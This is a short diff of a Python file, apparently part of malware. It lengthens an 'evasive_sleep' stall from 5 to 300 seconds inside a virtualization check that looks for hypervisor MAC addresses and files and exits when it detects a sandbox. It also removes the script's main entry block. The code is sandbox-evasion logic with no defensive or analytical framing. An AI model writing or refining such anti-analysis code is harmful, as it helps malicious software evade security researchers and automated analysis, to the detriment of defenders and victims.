@@ -135,7 +135,7 @@ def check_system_requirements():
     return False
 
 def check_virtualization():
-    evasive_sleep(5)  
+    evasive_sleep(300)  
     if (
         check_hypervisor_mac(get_mac_address())
         or check_hypervisor_files()
@@ -145,5 +145,3 @@ def check_virtualization():
         print("Virtualización detectada")
         sys.exit(0)
     
-if __name__ == "__main__":
-    check_virtualization()
